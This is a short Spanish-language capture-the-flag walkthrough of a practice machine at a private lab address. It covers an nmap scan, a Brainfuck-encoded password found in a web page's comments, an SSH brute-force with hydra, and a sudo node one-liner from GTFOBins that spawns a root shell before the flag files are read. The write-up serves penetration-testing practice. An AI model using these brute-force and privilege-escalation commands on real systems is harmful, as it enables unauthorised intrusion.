
ejecutamos el siguiente comando 
nmap -sV -sC  192.168.100.160

![[Pasted image 20260929012550.png]]
Revisamos la pagina web 
y encontramos  algo raro en los comentarios 
![[Captura de pantalla 2026-09-29 012625.png]]


![[Captura de pantalla 2026-09-29 012802.png]]

 Nos encontramos estas curiosas lineas que parecen estar escrito en **Brainfuck** por tanto vamos a intentar descodificar el codigo .
    
- Voy a usar la web [https://www.dcode.fr/](https://github.com/TerragensPL/CTF-Write-ups/blob/main/thehackerslabs.com/imagenes/https:/www.dcode.fr) para intentar desentrañar el código.
![[Pasted image 20260929094836.png]]

una vez decodificamos  sale los siguiente abuelacalientalasopa 
y creamos nuestro diccionario para intentar ingresar esta maquina 
abuela
calienta
lasopa
y usamos la herramienta hydra  
hydra -L cliente.txt -p abuelacalientalasopa  ssh://192.168.100.160 


![[Pasted image 20260929012513.png]]

Buscamos en [GTFOBins](https://gtfobins.github.io/gtfobins/node/#sudo) y vemos como escalar.

![[Pasted image 20260929012315.png]]

sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'

![[Pasted image 20260929012426.png]]

y encontramos el cat user.txt
y encontramos el cat root.txt 
